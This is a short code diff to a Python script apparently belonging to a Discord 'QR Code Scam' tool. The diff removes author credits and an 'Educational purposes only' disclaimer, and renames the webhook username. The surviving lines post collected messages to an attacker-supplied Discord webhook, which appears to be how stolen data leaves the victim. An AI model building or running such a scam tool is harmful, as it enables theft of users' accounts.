@@ -7,9 +7,6 @@ import os
 import requests
 import json
 
-# Developer: NightfallGT
-# Discord webhook and text dump functionality: KliqxTV
-# Educational purposes only
 
 WEBHOOK_URL = '<your webhook url>'
 
@@ -101,7 +98,7 @@ def main():
 
             payload = json.dumps({
                 'content': message,
-                "username": "Retarded QR Code Scam"
+                "username": "QR Code Scam"
                 })
 
             req = requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
